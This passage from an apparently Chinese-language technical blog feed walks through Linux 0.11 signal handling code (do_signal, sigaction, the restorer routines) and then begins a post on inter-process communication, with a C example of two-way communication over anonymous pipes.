SIG_IGN((void (*)(int))1)<span class="comment">// 忽略信号对应的处理程序</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="keyword">sigset_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> &#123;</span></span><br><span class="line"><span class="keyword">void</span> (*sa_handler)(<span class="keyword">int</span>);<span class="comment">// 信号处理程序指针</span></span><br><span class="line"><span class="keyword">sigset_t</span> sa_mask;<span class="comment">// 指出当前信号处理程序执行期间需要被屏蔽的信号</span></span><br><span class="line"><span class="keyword">int</span> sa_flags;<span class="comment">// 从 37 行的三个定义中选出</span></span><br><span class="line"><span class="keyword">void</span> (*sa_restorer)(<span class="keyword">void</span>);<span class="comment">// 恢复函数指针，由 libc 提供</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>每个进程都有自己的 task_struct 任务结构体（定义在 include/linux/sched.h），结构体中就包含了 32 个这样的 sigaction 结构体（禁止套娃），每个 sigaction 结构体对应一个信号。当有信号到来时，CPU 就是通过当前任务 task_struct 中元素个数为 32 的 sigaction 结构体数组找到对应信号的处理方式的。当然 0.11 版本中，Linux 只实现了 22 个信号</p><br><h3 id="0-11-版本中的信号处理流程"><a href="#0-11-版本中的信号处理流程" class="headerlink" title="0.11 版本中的信号处理流程"></a>0.11 版本中的信号处理流程</h3><p>还记得在 kernel（一）介绍 system_call.s 部分时 ret_from_sys_call 的代码吗？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/system_call.s Line 101</span></span><br><span class="line">ret_from_sys_call:</span><br><span class="line">movl current,%eax<span class="comment">/* 取当前任务的结构体指针 */</span></span><br><span class="line">cmpl task,%eax<span class="comment">/* 与 task[0] 的地址进行比较，判断是否为进程 0 */</span></span><br><span class="line">je <span class="number">3f</span><span class="comment">/* 如果是进程 0，就不需要进行信号处理，直接返回 */</span></span><br><span class="line">cmpw $<span class="number">0x0f</span>,CS(%esp)<span class="comment">/* 判断原调用程序的代码段选择子是否为 0x0f(RPL=3，LDT，代码段) */</span></span><br><span class="line">jne <span class="number">3f</span><span class="comment">/* 来确定是否为用户任务，如果是某个中断服务程序则直接返回 */</span></span><br><span class="line">cmpw $<span class="number">0x17</span>,OLDSS(%esp)<span class="comment">/* 如果原调用程序的堆栈选择符不在用户(局部)段中，也直接返回 */</span></span><br><span class="line">jne <span class="number">3f</span><span class="comment">/* 以上为信号的预识别处理 */</span></span><br><span class="line"><span class="function">movl <span class="title">signal</span><span class="params">(%eax)</span>,%ebx<span class="comment">/* ebx = 当前任务信号位图 */</span></span></span><br><span class="line"><span class="function">movl <span class="title">blocked</span><span class="params">(%eax)</span>,%ecx<span class="comment">/* ecx = 阻塞(屏蔽)信号位图 */</span></span></span><br><span class="line"><span class="function">notl %ecx<span class="comment">/* 按位取反得到允许的信号位图 */</span></span></span><br><span class="line"><span class="function">andl %ebx,%ecx<span class="comment">/* 与当前任务信号位图按位与，得到本次中断处理后的信号位图 */</span></span></span><br><span class="line"><span class="function">bsfl %ecx,%ecx<span class="comment">/* 从 0 位开始扫描位图，遇到有 1 的位将其偏移(0-31 位)保存在 ecx 中 */</span></span></span><br><span class="line"><span class="function">je 3f<span class="comment">/* 如果没有信号则直接返回 */</span></span></span><br><span class="line"><span class="function">btrl %ecx,%ebx<span class="comment">/* 将 ebx 第 ecx 位复位（ebx 为原当前任务信号位图） */</span></span></span><br><span class="line"><span class="function">movl %ebx,<span class="title">signal</span><span class="params">(%eax)</span><span class="comment">/* 重新设置当前任务位图 */</span></span></span><br><span class="line"><span class="function">incl %ecx<span class="comment">/* 将信号值范围调整为 1 ~ 32 */</span></span></span><br><span class="line"><span class="function">pushl %ecx<span class="comment">/* 压栈作为 do_signal 的参数 */</span></span></span><br><span class="line"><span class="function">call do_signal</span></span><br><span class="line"><span class="function">popl %eax</span></span><br><span class="line"><span class="function">3:popl %eax</span></span><br><span class="line"><span class="function">popl %ebx</span></span><br><span class="line"><span class="function">popl %ecx</span></span><br><span class="line"><span class="function">popl %edx</span></span><br><span class="line"><span class="function">pop %fs</span></span><br><span class="line"><span class="function">pop %es</span></span><br><span class="line"><span class="function">pop %ds<span class="comment">/* 恢复现场 */</span></span></span><br><span class="line"><span class="function">iret<span class="comment">/* 中断返回 */</span></span></span><br></pre></td></tr></table></figure><p>进程每次调用系统调用或发生时钟等中断时，在结束部分都会来到这里，进行信号的处理。如果进程收到了信号，则 do_signal 函数就会把<strong>信号处理函数指针插入到用户堆栈</strong>中。如此一来，当前 <strong>系统调用/中断</strong> 结束返回(iret)后就会立即执行信号处理函数（用户态下）。信号处理函数执行结束后，执行 ret 指令，执行流来到 sa_restorer 指向的恢复程序(sigaction 结构体最后一个字段，由 libc 提供)，该程序将 CPU 及寄存器的状态恢复到<strong>系统调用后信号处理前</strong>的状态，仿佛没有执行过信号处理函数一样。最后 sa_restorer 通过 ret 指令回到原用户程序继续执行，流程如图：</p><p><img src="../img/s2.png" alt="信号处理"></p><br><h3 id="do-signal-的实现"><a href="#do-signal-的实现" class="headerlink" title="do_signal 的实现"></a>do_signal 的实现</h3><p>do_signal 的参数是系统调用等压入的所有信息，其中 signr 是接收到的信号值，eax 是系统调用的返回值，其余都是保存的用户态的信息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Line 92</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_signal</span><span class="params">(<span class="keyword">long</span> signr,<span class="keyword">long</span> eax, <span class="keyword">long</span> ebx, <span class="keyword">long</span> ecx, <span class="keyword">long</span> edx,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">long</span> fs, <span class="keyword">long</span> es, <span class="keyword">long</span> ds,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">long</span> eip, <span class="keyword">long</span> cs, <span class="keyword">long</span> eflags,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> * esp, <span class="keyword">long</span> ss)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> sa_handler;</span><br><span class="line"><span class="keyword">long</span> old_eip=eip;<span class="comment">// 将原用户态 eip 保存在变量 old_eip 中</span></span><br><span class="line"><span class="comment">// 从当前任务 sigaction 结构体数组中取出信号值对应的 sigaction 结构体</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> * <span class="title">sa</span> =</span> current-&gt;sigaction + signr - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> longs;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> * tmp_esp;</span><br><span class="line"></span><br><span class="line">sa_handler = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) sa-&gt;sa_handler;<span class="comment">// 将信号处理函数指针保存在 sa_handler 中</span></span><br><span class="line"><span class="keyword">if</span> (sa_handler==<span class="number">1</span>)<span class="comment">// 如果信号处理函数是 SIG_IGN，表示忽略该信号，直接返回</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">if</span> (!sa_handler) &#123;<span class="comment">//  如果信号处理函数是 SIG_DFL，表示按默认方式处理</span></span><br><span class="line"><span class="keyword">if</span> (signr==SIGCHLD)<span class="comment">// 如果信号值为 SIGCHLD，也不作处理，直接返回</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">else</span><span class="comment">// 否则终止进程，故默认处理方式一般效果是终止进程</span></span><br><span class="line">do_exit(<span class="number">1</span>&lt;&lt;(signr<span class="number">-1</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (sa-&gt;sa_flags &amp; SA_ONESHOT)<span class="comment">// 如果信号处理函数只需被调用一次，则将其置为 NULL</span></span><br><span class="line">sa-&gt;sa_handler = <span class="literal">NULL</span>;<span class="comment">// 注意上面已经将 sa-&gt;sa_handler 保存在 sa_handler 里了</span></span><br><span class="line">*(&amp;eip) = sa_handler;<span class="comment">// 将原用户程序返回地址替换为信号处理函数的地址</span></span><br><span class="line"><span class="comment">// 如果允许处理信号过程中再次收到该信号，longs 为 7，否则为 8</span></span><br><span class="line">longs = (sa-&gt;sa_flags &amp; SA_NOMASK)?<span class="number">7</span>:<span class="number">8</span>;</span><br><span class="line">*(&amp;esp) -= longs;<span class="comment">// 在用户栈中开拓 4 * longs 大小的空间，用于存放 longs 个数据</span></span><br><span class="line">verify_area(esp,longs*<span class="number">4</span>);<span class="comment">// 检查内存使用情况，如果存在内存超界，则分配新内存页等</span></span><br><span class="line">tmp_esp=esp;<span class="comment">// 获取现在的用户栈栈顶指针的值，准备在用户栈中放入数据</span></span><br><span class="line">put_fs_long((<span class="keyword">long</span>) sa-&gt;sa_restorer,tmp_esp++);<span class="comment">// 存入恢复程序的地址</span></span><br><span class="line">put_fs_long(signr,tmp_esp++);<span class="comment">// 存入信号值</span></span><br><span class="line"><span class="keyword">if</span> (!(sa-&gt;sa_flags &amp; SA_NOMASK))<span class="comment">// 如果不允许处理信号过程中再次收到该信号</span></span><br><span class="line">put_fs_long(current-&gt;blocked,tmp_esp++);<span class="comment">// 还需存入信号屏蔽码</span></span><br><span class="line">put_fs_long(eax,tmp_esp++);<span class="comment">// 存入系统调用返回值</span></span><br><span class="line">put_fs_long(ecx,tmp_esp++);<span class="comment">// 依次存入 ecx,edx,eflags,old_eip</span></span><br><span class="line">put_fs_long(edx,tmp_esp++);</span><br><span class="line">put_fs_long(eflags,tmp_esp++);</span><br><span class="line">put_fs_long(old_eip,tmp_esp++);</span><br><span class="line">current-&gt;blocked |= sa-&gt;sa_mask;<span class="comment">// 当前进程的阻塞码添上 sa_mask 中的屏蔽位</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用两张图来总结一下 do_signal 带来的一些改变。执行前，内核堆栈与用户堆栈情况如下：</p><p><img src="../img/s3.png" alt="do_signal之前"></p><p>执行后，变成了这样：</p><p><img src="../img/s4.png" alt="do_signal之后"></p><br><h3 id="sa-restorer-恢复函数"><a href="#sa-restorer-恢复函数" class="headerlink" title="sa_restorer 恢复函数"></a>sa_restorer 恢复函数</h3><p>因此调用完 do_signal 并且 iret 中断返回后，就会到用户态去执行信号处理函数，且 esp 指向 sa_restorer。信号处理函数通过 ret 指令，就会去到 sa_restorer 执行恢复函数，该函数在 Libc-2.2.2 函数库中有定义：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">/* 如果没有屏蔽码，使用该函数作为恢复函数 */</span><br><span class="line">sig_restore:</span><br><span class="line">addl $4,%esp/* 丢弃 signr */</span><br><span class="line">popl %eax/* 系统调用返回值还原到 eax */</span><br><span class="line">popl %ecx/* 还原 ecx,edx */</span><br><span class="line">popl %edx</span><br><span class="line">popfl/* 恢复 eflags */</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">/* 如果有屏蔽码，使用该函数 */</span><br><span class="line">masksig_restore:</span><br><span class="line">addl $4,%esp</span><br><span class="line">call ssetmask/* 设置信号屏蔽码 */</span><br><span class="line">addl $4,%esp/* 丢弃屏蔽码 */</span><br><span class="line">popl %eax</span><br><span class="line">popl %ecx</span><br><span class="line">popl %edx</span><br><span class="line">popfl</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>ret 后回到原用户程序继续执行，一次信号处理就算完成了</p><br><h3 id="signal-c-剩余部分"><a href="#signal-c-剩余部分" class="headerlink" title="signal.c 剩余部分"></a>signal.c 剩余部分</h3><p>实际上，设置信号处理句柄的函数除了 signal 外，还有 sigaction。与 signal 不同的是，给 sigaction 传参时，除了信号值外，还需要两个 sigaction 结构体，一个用于设置新信号处理结构体，一个用于接收原信号处理结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Line 73</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_sigaction</span><span class="params">(<span class="keyword">int</span> signum, <span class="keyword">const</span> struct sigaction * action,</span></span></span><br><span class="line"><span class="params"><span class="function">struct sigaction * oldaction)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">tmp</span>;</span></span><br><span class="line"><span class="comment">// 信号值在 1 ~ 32 之前，且 SIGKILL 不能被捕获</span></span><br><span class="line"><span class="keyword">if</span> (signum&lt;<span class="number">1</span> || signum&gt;<span class="number">32</span> || signum==SIGKILL)</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">tmp = current-&gt;sigaction[signum<span class="number">-1</span>];<span class="comment">// 获取信号对应结构体</span></span><br><span class="line">get_new((<span class="keyword">char</span> *) action,</span><br><span class="line">(<span class="keyword">char</span> *) (signum<span class="number">-1</span>+current-&gt;sigaction));<span class="comment">// 设置新信号处理结构体</span></span><br><span class="line"><span class="keyword">if</span> (oldaction)<span class="comment">// 如果 oldaction 非空</span></span><br><span class="line">save_old((<span class="keyword">char</span> *) &amp;tmp,(<span class="keyword">char</span> *) oldaction);<span class="comment">// 则保存原信号处理结构体</span></span><br><span class="line"><span class="comment">// 如果允许信号在自己的信号处理过程中收到，则屏蔽码为 0</span></span><br><span class="line"><span class="keyword">if</span> (current-&gt;sigaction[signum<span class="number">-1</span>].sa_flags &amp; SA_NOMASK)</span><br><span class="line">current-&gt;sigaction[signum<span class="number">-1</span>].sa_mask = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">else</span><span class="comment">// 否则设置屏蔽本信号</span></span><br><span class="line">current-&gt;sigaction[signum<span class="number">-1</span>].sa_mask |= (<span class="number">1</span>&lt;&lt;(signum<span class="number">-1</span>));</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Line 38</span></span><br><span class="line"><span class="comment">// get_new 与 save_old 的作用都是将结构体将数据从 from 拷贝至 to</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">save_old</span><span class="params">(<span class="keyword">char</span> * from,<span class="keyword">char</span> * to)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">verify_area(to, <span class="keyword">sizeof</span>(struct sigaction));</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span> ; i&lt; <span class="keyword">sizeof</span>(struct sigaction) ; i++) &#123;</span><br><span class="line">put_fs_byte(*from,to);<span class="comment">// 从内核空间取 1 字节数据放到用户空间</span></span><br><span class="line">from++;</span><br><span class="line">to++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">get_new</span><span class="params">(<span class="keyword">char</span> * from,<span class="keyword">char</span> * to)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span> ; i&lt; <span class="keyword">sizeof</span>(struct sigaction) ; i++)</span><br><span class="line">*(to++) = get_fs_byte(from++);<span class="comment">// 将 1 字节数据从用户空间取到内核空间</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>余下的部分定义了一些系统调用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Line 7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/segment.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">volatile</span> <span class="keyword">void</span> <span class="title">do_exit</span><span class="params">(<span class="keyword">int</span> error_code)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取当前任务信号屏蔽码</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_sgetmask</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> current-&gt;blocked;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置当前任务信号屏蔽码，返回原屏蔽码</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_ssetmask</span><span class="params">(<span class="keyword">int</span> newmask)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> old=current-&gt;blocked;</span><br><span class="line"></span><br><span class="line">current-&gt;blocked = newmask &amp; ~(<span class="number">1</span>&lt;&lt;(SIGKILL<span class="number">-1</span>));</span><br><span class="line"><span class="keyword">return</span> old;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检测并获取进程收到但被屏蔽的信号，0.11 中没有实现</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_sigpending</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> -ENOSYS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 临时把进程信号屏蔽码替换为给定的屏蔽码，0.11 中没有实现</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_sigsuspend</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> -ENOSYS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
            <tag> Linux0.11 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>进程间通信方式</title>
      <link href="/2020/04/06/%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F/"/>
      <url>/2020/04/06/%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="为什么需要进程间通信"><a href="#为什么需要进程间通信" class="headerlink" title="为什么需要进程间通信"></a>为什么需要进程间通信</h2><p>进程间通信(IPC)好比 RPG 游戏中的事件，主角需要与 NPC 对话，从他们口中得知重要情报以推进游戏。多进程的程序，进程间几乎都会涉及数据的共享、事件的到来、消息的通知等。</p><p>考虑进程间如果有重叠的空间，进程 A 将通信数据放在重叠部分，进程 B 从重叠部分直接取走数据，那么进程间通信就会非常轻松。但是这样做可能会带来一些安全隐患，比如进程 A 对重叠部分的修改导致了对进程 B 控制流的劫持、或者对 B 的数据区域造成了误修改，于是引进了虚拟内存这项技术</p><p>有虚存的存在，每个进程享有自己独立的进程空间，进程间不会有交叠部分，但是他们之间的通信就变得困难起来。为了解决这个问题，操作系统就作为进程间通信的第三方，进程 A 要与进程 B 通信，需先将数据交由 OS，再由 OS 来通知进程 B，从而实现进程间的间接交流</p><br><h2 id="Linux-进程间通信方式"><a href="#Linux-进程间通信方式" class="headerlink" title="Linux 进程间通信方式"></a>Linux 进程间通信方式</h2><ul><li>管道：<ul><li>无名管道</li><li>有名管道</li></ul></li><li>system V IPC<ul><li>消息队列</li><li>共享内存</li><li>信号量</li></ul></li><li>域套接字</li></ul><p>本文只对管道与 system V IPC 两个通信类别进行探讨</p><br><h3 id="无名管道"><a href="#无名管道" class="headerlink" title="无名管道"></a>无名管道</h3><blockquote><p>什么是管道及其读写方式</p></blockquote><p>管道是内核在自己所在的<strong>内核空间里开辟的一块缓存空间</strong>，其以文件的方式读写，读写时会用到 write，read 等文件 IO 函数，也会有文件读写用的文件描述符。</p><p>无名管道正是因为其没有文件名，所以才叫做无名管道。那么没有文件名，自然无法用 open 函数来打开管道文件并获取文件描述符。针对这种情况，内核提供了 pipe 系统 API，其函数原型为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pipe</span><span class="params">(<span class="keyword">int</span> pipefd[<span class="number">2</span>])</span></span>;</span><br></pre></td></tr></table></figure><ul><li>功能：创建一个用于<strong>亲缘进程</strong>之间通信的无名管道，并将管道与两个读写文件描述符关联起来</li><li>参数：<ul><li>pipefd[0]：用于存放读管道的读文件描述符</li><li>pipefd[1]：用于存放写管道的写文件描述符</li></ul></li><li>返回值：<ul><li>成功返回 0</li><li>失败返回 -1，并设置 errno</li></ul></li></ul><p>亲缘进程就是存在继承关系的进程，分为两种：</p><ul><li>直接继承关系：父进程 -&gt; 子进程</li><li>间接继承关系：父进程 -&gt; 子进程 -&gt; 孙进程 -&gt; …</li></ul><p>也就是说，无名管道通过父进程调用 pipe 创建，该管道的读写描述符放在 pipefd 数组中，父进程再调用 fork 创建子进程。子进程由于继承父进程的数据空间，也会有 pipefd 数组，由此获知无名管道的文件描述符。于是，对于有继承关系的进程，都可以与这条继承链上的其他进程进行通信。</p><br><blockquote><p>单向通信</p></blockquote><p>父子进程之间单向通信的图示如下：</p><p><img src="../img/w1.png" alt="单向通信"></p><p>要么父进程通过蓝色的线路与子进程通信，要么子进程通过红色的线路与父进程通信，一个管道不能满足父子进程之间的双向通信，因为进程写到管道里的东西会被自己抢先读出来</p><p>需要注意的是，如果管道中没有数据，读操作会使进程休眠（阻塞），如同 scanf 函数等待输入</p><br><blockquote><p>双向通信</p></blockquote><p>若想实现父子进程之间双向通信，就需要两个管道</p><p>图示如下：</p><p><img src="../img/w2.png" alt="双向通信"></p><p>管道 1 用于父进程向子进程通信，管道 2 用于子进程向父进程通信。不需要的管道（图中用黑x去掉的描述符）通过 close 函数关闭掉，避免其他程序误操作这些描述符对进程通信造成影响，简化后：</p><p><img src="../img/w3.png" alt="双向通信"></p><p>下面通过一个程序来实现父子进程的双向通信</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> pipefd1[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> pipefd2[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> msg[<span class="number">100</span>];</span><br><span class="line"><span class="comment">// 使用 pipe 创建两个管道</span></span><br><span class="line"><span class="keyword">if</span>(pipe(pipefd1) == <span class="number">-1</span> || pipe(pipefd2) == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">perror(<span class="string">&quot;Unamed Pipe Create Failed&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!fork())</span><br><span class="line">&#123;<span class="comment">// 子进程程序部分</span></span><br><span class="line">close(pipefd1[<span class="number">1</span>]);</span><br><span class="line">close(pipefd2[<span class="number">0</span>]);<span class="comment">// 关闭子进程管道 1 写与管道 2 读</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">read(pipefd1[<span class="number">0</span>], msg, <span class="keyword">sizeof</span>(msg));<span class="comment">// 从管道 1 中读入数据并打印</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Child recv: %s&quot;</span>, msg);</span><br><span class="line"><span class="built_in">memset</span>(msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">read(<span class="number">0</span>, msg, <span class="keyword">sizeof</span>(msg));<span class="comment">// 从标准输入读入字符串</span></span><br><span class="line">write(pipefd2[<span class="number">1</span>], msg, <span class="keyword">sizeof</span>(msg));<span class="comment">// 